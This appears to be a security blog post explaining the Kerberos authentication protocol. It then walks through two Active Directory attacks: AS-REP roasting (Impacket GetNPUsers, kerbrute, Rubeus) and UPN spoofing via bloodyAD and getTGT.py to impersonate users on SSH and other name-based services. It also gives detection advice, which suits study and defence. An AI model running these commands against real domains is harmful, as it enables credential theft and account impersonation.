---
title: Kerberos Protocol
layout: post
date: 2025-04-25
media_subpath: /theory/protocols/assets/kerberos/
---

## Kerberos Protocol Overview

Kerberos is a network authentication protocol designed to provide secure authentication for users and services in a distributed computing environment. It uses symmetric key cryptography and a trusted third party (the Key Distribution Center, or KDC) to facilitate secure communication between clients and servers.

There are three main components (Three Cerberus Heads) in the Kerberos protocol:

- **Principal**: A user or service that requires authentication. Can be a User Principal `athena@GREECE.LOCAL` or a Service Principal `HTTP/WEB01.GREECE.LOCAL`.
- **Key Distribution Center (KDC)**: The trusted third party that issues tickets for authentication. It manages the authentication and distributing session keys in a realm. It consists of two parts:
  - Kerberos Database (KDB): Stores the secret keys for all principals in the realm.
  - Authentication Service (AS): Issues Ticket Granting Tickets (TGTs) to principals.
  - Ticket Granting Service (TGS): This service accepts the TGTs and issues service tickets to clients for accessing specific services.
- **Resource**: The asset or service that the client wants to access.

> What is a realm?
A realm is a logical network or domain that uses Kerberos for authentication. It is typically associated with a specific organization or administrative domain. Each realm has its own KDC, which manages the authentication process for users and services within that realm. Realms can be interconnected, allowing users from one realm to access resources in another realm through trust relationships. On Windows, domains are often used in conjunction with Kerberos to define security boundaries and manage user accounts, permissions, and policies.
{: .prompt-info}

## Kerberos Tickets

Kerberos uses tickets to authenticate users and services. A ticket is a time-limited credential that contains two encryption keys:

- **Session Key**: A temporary key used for encrypting communication between the client and the service.
- **The ticket key**: Shared between the Kerberos infrastructure and the service.

## Kerberos Authentication Process

![The three Kerberos exchanges between client, KDC and resource server](file-20250424214228502.png)
_The three exchanges. Step 1 (AS-REQ / AS-REP) obtains a TGT, step 2 (TGS-REQ / TGS-REP) exchanges that TGT for a service ticket, step 3 (AP-REQ / AP-REP) presents the service ticket to the resource. Note that the diagram's "with NTLM pass" is shorthand: the client does not send the password or its hash, it encrypts a timestamp with a key derived from the password. With RC4-HMAC that key is the NT hash itself, which is what makes pass-the-hash work against Kerberos; with AES etypes the key is derived from the password and the realm salt instead._

The Kerberos authentication process involves several steps:

1. **Client Authentication Request**: The client sends a request to the KDC's Authentication Service (AS) for a Ticket Granting Ticket (TGT). This request includes the client's principal name and a timestamp. 

  - Principal requests a TGT from the KDC, by sending a request to the AS (AS-REQ).
  - The AS verifies the credentials, looks up the password hash in the KDB, and decrypts the timestamp using the password hash.
  - If the timestamp is unique, the AS authenticates the principal
  - The principal then receives an Authentication Server Reply (AS-REP) containing the TGT and a session key.

2. **Granting Permission:** With the TGT, the client can request access to specific services from the Ticket Granting Service (TGS). The TGT is encrypted with the KDC's secret key, ensuring its integrity and confidentiality.

  - The client sends a request to the TGS (TGS-REQ) along with the TGT, name of the resource and an authenticator (a timestamp encrypted with the session key)
  - After receiving the request, the TGS on the KDC checks if the resource exists in the Realm, decrypts the TGT and extracts the session keys. 
  - If is all valid, the TGS generates a service ticket (TGS-REP) for the requested resource, which includes the name of the service for the service that has been granted, a new session key to be used between the Principal and the Service and is encrypted with the resource's secret key, and the Service Ticket (ST).

3. **Service Access**: The client sends the service ticket to the requested service along with an authenticator (a timestamp encrypted with the session key). The service decrypts the ticket using its secret key and verifies the client's identity.

  - The client sends the service ticket to the requested service (AP-REQ) along with an authenticator (username and timestamp encrypted with the session key).
  - The service decrypts the ticket using its secret key and verifies the client's identity.
  - The service checks if the AP-REQ username matches the username in the service ticket and if the timestamp is valid.
  - Then the service checks the privileges of the user and grants access to the requested resource.
  - The service sends a response (AP-REP) back to the client, confirming the successful authentication and access to the resource.
  - The client and service can now communicate securely using the session key established during the authentication process.

## Kerberos Protocol Attacks

### AS-REP Roast Attack

The AS-REP roast attack is a method used to extract the password hash of a user account in a Kerberos environment. With pre-authentication disabled, the attacker can send a AS-REQ to the AS on behalf of the user, upon receiving the AS-REP request the attacker can extract the encrypted TGT and the session key. The attacker can then use this information to perform offline password cracking attacks to recover the user's password.

**Requirements:**

- The attacker must have access to the network where the KDC is located.
- The attacker must be able to send AS-REQ requests to the KDC.
- The attacker must be able to capture the AS-REP response from the KDC.
- **The target account must have pre-authentication disabled.**

**Enumeration From Linux:**

To enumerate users with pre-authentication disabled, you can use the `GetNPUsers.py` command from the Impacket library. This command will query the KDC for all users in the domain and check if they have pre-authentication disabled.

```bash
GetNPUsers.py DOMAIN/ 
```

**Enumeration From Windows:**

To enumerate users with pre-authentication disabled, you can use:

- The defualt `ActiveDirectory` powershell module

```powershell
Get-ADUser -Filter * -Properties userAccountControl | Where-Object {
    $_.userAccountControl -band 4194304
} | Select-Object Name, SamAccountName, DistinguishedName
```

- `Powerview.ps1` from the PowerSploit library. This command will query the KDC for all users in the domain and check if they have pre-authentication disabled.

```powershell
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

**Attack:**

We can add the flag `-request` to the `GetNPUsers.py` command to request the TGT for the user with pre-authentication disabled. This will return the encrypted TGT and the session key.

```bash
GetNPUsers.py DOMAIN/ -request
```

If you have a list of possible users, while enumerating with Kerbrute, it will automatically request the TGT for each user with pre-authentication disabled.

```bash
kerbrute  -d DOMAIN --dc DC userenum USERLIST
```


We can use the `Rubeus` tool to request the TGT for the user with pre-authentication disabled. This will return the encrypted TGT and the session key.

```powershell
Rubeus.exe asreproast 
```

### Enterprise Principal Names and UPN Spoofing

Every Kerberos principal name carries a **name type**, and the type tells the KDC how to resolve the string it is given.

| Name type | The name is | The KDC resolves it by |
|---|---|---|
| `NT_PRINCIPAL` | a `sAMAccountName` | looking up the account name |
| `NT_ENTERPRISE` | a UPN | searching for an account whose `userPrincipalName` matches exactly |
| `NT_SRV_INST` / `NT_SRV_HST` | a service principal name | looking up the registered SPN |

`NT_ENTERPRISE` exists so that a user can log in with `firstname.lastname@company.com` even when their `sAMAccountName` is something else entirely. The KDC performs an exact-match search on `userPrincipalName`, verifies the found account's key against the pre-authentication data, and issues a TGT whose client name is the enterprise name that was requested.

**The abuse:** `userPrincipalName` is a normal writable attribute. AD requires it to be unique in the forest but does not require it to contain an `@domain` suffix, and does not require it to relate to the account it sits on. So a principal with `WriteProperty` on `userPrincipalName` (or `GenericWrite` / `GenericAll`, which include it) over an account it already controls can write **another user's name** into that attribute and then request a ticket under it.

The password that gets verified belongs to the controlled account. The name in the resulting ticket belongs to somebody else.

```bash
# 1. write the victim's bare name into a controlled account's UPN
bloodyAD -u 'attacker' -p 'Passw0rd!' -d '<DOMAIN>' --host '<DC>' \
    set object controlled_user userPrincipalName -v 'victim'

# 2. ask for a TGT for the enterprise principal 'victim',
#    authenticating with the controlled account's own password or hash
getTGT.py <DOMAIN>/victim:'ControlledPassword' -principalType NT_ENTERPRISE
```

Writing the **bare** name (`victim`, not `victim@domain.tld`) matters: the real account normally holds `victim@domain.tld`, so the bare string does not collide and the write is accepted.

**Where it pays off.** The PAC inside the resulting ticket still describes the controlled account, so anything that authorises on the SID list is unaffected. The attack lands against services that authorise on the **principal name string**, which is most of the Unix side of a mixed environment:

- `sshd` with `GSSAPIAuthentication yes` checks whether the client principal is allowed to become the requested local user, which is a name comparison.
- SSSD, NFSv4, and anything else that maps a Kerberos principal to a POSIX identity by name.

```bash
export KRB5CCNAME=victim.ccache
ssh -o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=yes victim@host.<DOMAIN>
```

> `userPrincipalName` looks like a cosmetic attribute in an access review, and `GenericWrite` over an unprivileged user looks like a low-severity finding. Together they are an authentication bypass against every Kerberos consumer that trusts the name in a ticket. Alert on `userPrincipalName` modifications the same way you alert on password resets.
{: .prompt-danger}

## References

- [Microsoft](https://learn.microsoft.com/en-us/windows-server/security/kerberos/)
- [Optiv](https://www.optiv.com/insights/source-zero/blog/kerberos-domains-achilles-heel)
- [Picussecurity](https://www.picussecurity.com/resource/blog/as-rep-roasting-attack-explained-mitre-attack-t1558.004)
- [HackTheBox](https://www.hackthebox.com/blog/what-is-kerberos-authentication)
- [HackTricks](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/asreproast.html)
